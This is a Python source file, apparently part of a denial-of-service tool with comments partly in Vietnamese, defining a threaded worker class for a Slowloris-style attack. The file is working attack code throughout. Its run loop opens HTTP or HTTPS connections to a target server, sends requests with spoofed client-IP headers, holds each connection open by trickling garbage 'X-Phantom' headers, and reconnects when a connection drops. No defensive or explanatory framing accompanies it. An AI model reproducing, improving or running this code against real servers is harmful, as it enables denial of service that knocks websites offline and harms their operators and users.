#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Attack Worker - Individual thread attack logic
"""

import socket
import ssl
import random
import time
import logging
from typing import Optional

from .statistics import AttackStatistics
from .ip_generator import IPGenerator
from .http_methods import HTTPMethodBuilder, HTTPMethod
from .tls_handler import TLSConfig, TLSHandler
from ..config import USER_AGENTS, DEFAULT_TIMEOUT, DEFAULT_KEEP_ALIVE_INTERVAL

class AttackWorker:
    """Worker class để thực hiện attack từ mỗi thread"""
    
    def __init__(
        self, 
        target_ip: str, 
        target_port: int, 
        stats: AttackStatistics, 
        worker_id: int, 
        use_spoofing: bool = True,
        http_method: Optional[HTTPMethod] = None,
        randomize_method: bool = False,
        timeout: int = DEFAULT_TIMEOUT, 
        keep_alive_interval: int = DEFAULT_KEEP_ALIVE_INTERVAL,
        tls_config: Optional[TLSConfig] = None
    ):
        """
        Initialize attack worker
        
        Args:
            target_ip: Target IP address
            target_port: Target port
            stats: Statistics tracker instance
            worker_id: Unique worker ID
            use_spoofing: Enable IP spoofing
            http_method: Specific HTTP method to use (None = GET)
            randomize_method: Use random HTTP method for each request
            timeout: Socket timeout
            keep_alive_interval: Interval between garbage headers
            tls_config: TLS configuration for HTTPS (None = HTTP)
        """
        self.target_ip = target_ip
        self.target_port = target_port
        self.stats = stats
        self.worker_id = worker_id
        self.use_spoofing = use_spoofing
        self.http_method = http_method or HTTPMethod.GET
        self.randomize_method = randomize_method
        self.timeout = timeout
        self.keep_alive_interval = keep_alive_interval
        self.tls_config = tls_config or TLSConfig()
        self.running = True
        
        # Initialize TLS handler if HTTPS enabled
        self.tls_handler = None
        if self.tls_config.use_https:
            self.tls_handler = TLSHandler(self.tls_config)
        
    def stop(self):
        """Dừng worker"""
        self.running = False
        
    def build_http_request(self, spoofed_ip: Optional[str]) -> str:
        """
        Xây dựng HTTP request với method được chọn
        
        Args:
            spoofed_ip: IP to spoof (None if spoofing disabled)
            
        Returns:
            Complete HTTP request string
        """
        user_agent = random.choice(USER_AGENTS)
        rand_param = random.randint(1, 999999)
        path = f"/?storm={rand_param}"
        
        # Choose method
        if self.randomize_method:
            # Random method each time
            return HTTPMethodBuilder.build_random(
                self.target_ip,
                path,
                user_agent,
                spoofed_ip
            )
        else:
            # Use specific method
            method_map = {
                HTTPMethod.GET: HTTPMethodBuilder.build_get,
                HTTPMethod.POST: HTTPMethodBuilder.build_post,
                HTTPMethod.HEAD: HTTPMethodBuilder.build_head,
                HTTPMethod.OPTIONS: HTTPMethodBuilder.build_options,
                HTTPMethod.PUT: HTTPMethodBuilder.build_put,
                HTTPMethod.DELETE: HTTPMethodBuilder.build_delete,
            }
            
            builder = method_map.get(self.http_method, HTTPMethodBuilder.build_get)
            return builder(
                self.target_ip,
                path,
                user_agent,
                spoofed_ip
            )
        
    def run(self):
        """Main worker loop - Slowloris style attack với IP spoofing và HTTPS support"""
        while self.running:
            sock = None
            spoofed_ip = None
            
            try:
                # Generate spoofed IP
                if self.use_spoofing:
                    spoofed_ip = IPGenerator.generate_public_ip()
                
                # Tạo socket connection
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.timeout)
                sock.connect((self.target_ip, self.target_port))
                
                # Wrap with SSL/TLS if HTTPS enabled
                if self.tls_config.use_https and self.tls_handler:
                    try:
                        # Use target IP as SNI hostname if not specified
                        sni_hostname = self.tls_config.sni_hostname or self.target_ip
                        sock = self.tls_handler.wrap_socket(sock, server_hostname=sni_hostname)
                        logging.debug(f"Worker {self.worker_id}: SSL/TLS handshake successful")
                    except ssl.SSLError as e:
                        self.stats.connection_failed(f"ssl_error_{type(e).__name__}")
                        logging.debug(f"Worker {self.worker_id}: SSL handshake failed - {e}")
                        raise
                
                self.stats.connection_established(spoofed_ip)
                logging.debug(f"Worker {self.worker_id}: Connected {'(HTTPS)' if self.tls_config.use_https else '(HTTP)'} with IP {spoofed_ip}")
                
                # Gửi HTTP request với spoofing headers
                http_request = self.build_http_request(spoofed_ip)
                sock.send(http_request.encode('utf-8'))
                self.stats.packet_sent()
                
                # Keep-alive loop: liên tục gửi garbage headers
                while self.running:
                    time.sleep(self.keep_alive_interval)
                    
                    # Gửi garbage header để giữ connection alive
                    garbage_header = f"X-Phantom-{random.randint(1,9999)}: {random.randint(1,99999)}\r\n"
                    sock.send(garbage_header.encode('utf-8'))
                    self.stats.packet_sent()
                    
            except ssl.SSLError as e:
                # SSL-specific errors
                error_type = f"ssl_{type(e).__name__}"
                self.stats.connection_failed(error_type)
                logging.debug(f"Worker {self.worker_id}: SSL error - {e}")
                
            except socket.timeout:
                self.stats.connection_failed("timeout")
                logging.debug(f"Worker {self.worker_id}: Connection timeout")
                
            except socket.error as e:
                error_type = type(e).__name__
                self.stats.connection_failed(error_type)
                logging.debug(f"Worker {self.worker_id}: Socket error - {error_type}")
                
            except Exception as e:
                error_type = type(e).__name__
                self.stats.connection_failed(error_type)
                logging.error(f"Worker {self.worker_id}: Unexpected error - {e}")
                
            finally:
                # Cleanup
                if sock:
                    try:
                        sock.close()
                        self.stats.connection_closed()
                    except:
                        pass
                
                # Delay trước khi reconnect
                if self.running:
                    time.sleep(0.5)
